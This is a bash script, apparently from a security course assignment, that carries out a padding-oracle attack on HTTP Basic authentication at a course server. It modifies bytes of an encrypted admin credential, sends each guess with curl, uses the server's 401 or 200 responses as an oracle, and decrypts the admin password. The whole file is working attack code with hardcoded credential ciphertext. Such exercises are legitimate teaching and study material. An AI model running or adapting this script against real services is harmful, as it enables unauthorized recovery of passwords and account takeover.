#!/bin/bash
# kati="test:029794db6e76cb559613732d7c94b24b360bb6f05879bb99e7765518b55abc57"
# half_key="029794db6e76cb559613732d7c94b24b"
#address="http://127.0.0.1:8000/"
#8d9e96d8033870f80127567d270d7d96
kati="admin:8c6e2f34df08e2f879e61eeb9e8ba96f8d9e96d8033870f80127567d270d7d96"
      
half_key="8c6e2f34df08e2f879e61eeb9e8ba96f"
address="http://project-2.csec.chatzi.org:8000/"

for i in $(seq 0 255);
do
    #new_char=$(printf "\\$(printf %o $i)")
    new_char=$(printf '%x\n' $i)

    if [ ${#new_char} -eq 1 ]
    then
        
        kati_new="${kati:0:36}0${new_char}${kati:38:69}" ############################################################CHANGE
    else
        kati_new="${kati:0:36}${new_char}${kati:38:69}" ############################################################CHANGE
    fi
    crypto=$(echo "$kati_new" | base64 -w0 )
    echo $kati_new
    curl_result=$(curl -v "$address" \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
  -H 'Accept-Language: el-GR,el;q=0.9,en;q=0.8,de;q=0.7' \
  -H "Authorization: Basic $crypto" \
  -H 'Cache-Control: no-cache' \
  -H 'Connection: keep-alive' \
  -H 'Pragma: no-cache' \
  -H 'Sec-Fetch-Dest: document' \
  -H 'Sec-Fetch-Mode: navigate' \
  -H 'Sec-Fetch-Site: none' \
  -H 'Sec-Fetch-User: ?1' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'User-Agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36' \
  -H 'sec-ch-ua: "Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"' \
  -H 'sec-ch-ua-mobile: ?1' \
  -H 'sec-ch-ua-platform: "Android"' \
  --compressed 2>&1)


    SUB='HTTP/1.1 401'
    if [[ "$curl_result" == *"$SUB"* ]]; then
        break
    fi
    SUB='HTTP/1.1 200'
    if [[ "$curl_result" == *"$SUB"* ]]; then
        break
    fi
  sleep 0.1
done


front_new="${half_key:0:30}${new_char}"

#echo $front_new

#echo $kati_new


for ((i=1; i<16; i++))
do
  let "var=30-$i*2"
  middle_num="${front_new:var:2}"
  middle_num_new=$(printf "%x\n" $((0x${middle_num}+1)))
  
  let "var1=30-$i*2"
  let "var2=32-$i*2"

  if [ ${#middle_num_new} -eq 1 ]
  then
    middle_num_new="0${middle_num_new}"
  fi

  num="${front_new:0:var1}${middle_num_new}${front_new:var2:31}"

  new_enc="admin:${num}8d9e96d8033870f80127567d270d7d96" ############################################################CHANGE

  crypto=$(echo "$new_enc" | base64 -w0 )

    curl_result=$(curl -v "$address" \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
  -H 'Accept-Language: el-GR,el;q=0.9,en;q=0.8,de;q=0.7' \
  -H "Authorization: Basic $crypto" \
  -H 'Cache-Control: no-cache' \
  -H 'Connection: keep-alive' \
  -H 'Pragma: no-cache' \
  -H 'Sec-Fetch-Dest: document' \
  -H 'Sec-Fetch-Mode: navigate' \
  -H 'Sec-Fetch-Site: none' \
  -H 'Sec-Fetch-User: ?1' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'User-Agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36' \
  -H 'sec-ch-ua: "Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"' \
  -H 'sec-ch-ua-mobile: ?1' \
  -H 'sec-ch-ua-platform: "Android"' \
  --compressed 2>&1)

  SUB='HTTP/1.1 401'
  if [[ "$curl_result" == *"$SUB"* ]]; then
    break
  fi
  SUB='HTTP/1.1 200'
  if [[ "$curl_result" == *"$SUB"* ]]; then
    break
  fi
  sleep 0.1
done

############################## create padding from integer
dec=$(printf '%x\n' $i)

#echo $dec

if [ ${#dec} -eq 1 ]
then
    dec="0${dec}"
fi

single_dec=$dec
for((pad=1; pad<$i; pad++))
do
  dec="${single_dec}${dec}"
done

#echo $dec
###############################
let "var=32-$i*2"

cut_enc="${front_new:var:32}"
key=""
for((char=0; char<${#dec}; char++))
do 
  key="${key}$(printf '%x\n' $(( 0x${cut_enc:$char:1} ^ 0x${dec:$char:1} )))"
done
#key=$(printf '%x\n' $(( 0x$cut_enc ^ 0x$dec )))

for((j=$i+1; j<=16; j++))
do
  echo "Begin:" $j
  padding=$(printf '%x\n' $j)

  #echo $dec

  if [ ${#padding} -eq 1 ]
  then
      padding="0${padding}"
  fi

  single_pad=$padding
  for((pad=1; pad<$j-1; pad++))
  do
    padding="${single_pad}${padding}"
  done
  #echo "Key:" $key
  #echo "Padding:" $padding

  #custom xor way
  # result=""
  # for((char=0; char<${#padding}; char++))
  # do 
  #   result="${result}$(printf '%x\n' $(( 0x${padding:$char:1} ^ 0x${key:$char:1} )))"
  # done
  # echo "New result:" $result
  new_ending_encr=""
  for((char=0; char<${#padding}; char++))
  do 
    new_ending_encr="${new_ending_encr}$(printf '%x\n' $(( 0x${padding:$char:1} ^ 0x${key:$char:1} )))"
  done
  #echo "Result:" $new_ending_encr
   
  let "var=${#half_key}-${#new_ending_encr}"
  #echo $var
  enc_pas_temp=${half_key:0:var}${new_ending_encr}
  enc_pas_temp="admin:${enc_pas_temp}8d9e96d8033870f80127567d270d7d96" ############################################################CHANGE
  #echo $enc_pas_temp
  for k in $(seq 0 255);
  do

    new_char=$(printf '%x\n' $k)
    let "var=38-$j*2" ############################################################CHANGE
    let "var1=$var+2"
    if [ ${#new_char} -eq 1 ]
    then
        new_char="0${new_char}" 
    fi
    kati_new="${enc_pas_temp:0:var}${new_char}${enc_pas_temp:var1:69}"

    #echo $kati_new
    crypto=$(echo "$kati_new" | base64 -w0 )

    curl_result=$(curl -v "$address" \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
  -H 'Accept-Language: el-GR,el;q=0.9,en;q=0.8,de;q=0.7' \
  -H "Authorization: Basic $crypto" \
  -H 'Cache-Control: no-cache' \
  -H 'Connection: keep-alive' \
  -H 'Pragma: no-cache' \
  -H 'Sec-Fetch-Dest: document' \
  -H 'Sec-Fetch-Mode: navigate' \
  -H 'Sec-Fetch-Site: none' \
  -H 'Sec-Fetch-User: ?1' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'User-Agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36' \
  -H 'sec-ch-ua: "Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"' \
  -H 'sec-ch-ua-mobile: ?1' \
  -H 'sec-ch-ua-platform: "Android"' \
  --compressed 2>&1)


    SUB='HTTP/1.1 401'
    if [[ "$curl_result" == *"$SUB"* ]]; then
        break
    fi
    SUB='HTTP/1.1 200'
    if [[ "$curl_result" == *"$SUB"* ]]; then
        break
    fi
    
  sleep 0.1
done
#echo $single_pad
#echo $new_char
new_key_part=""
  for((char=0; char<${#single_pad}; char++))
  do 
    new_key_part="${new_key_part}$(printf '%x\n' $(( 0x${single_pad:$char:1} ^ 0x${new_char:$char:1} )))"
  done
#new_key_part=$(printf '%x\n' $(( 0x$single_pad ^ 0x$new_char )))
#echo $new_key_part
key="${new_key_part}${key}"
echo "Latest Key:" $key
done

dec_string=""
for((char=0; char<${#key}; char++))
do 
  dec_string="${dec_string}$(printf '%x\n' $(( 0x${key:$char:1} ^ 0x${half_key:$char:1} )))"
done

echo "String is:" $dec_string

let "var=${#dec_string}-2"
last_two=${dec_string:$var:2}
echo "Last two:" $last_two
padding_length=$(printf "%d" $((16#$last_two)))

echo "Padding length" $padding_length
let "var=${#dec_string}-${padding_length}*2"
final_s=${dec_string:0:var}
echo "Final String:" $final_s

password=""
for((char=0; char<${#final_s}/2; char++))
do 
  let "var=$char*2"
  temp_pass=$(echo -e "\x${final_s:$var:2}")
  password="${password}${temp_pass}"
done
echo $password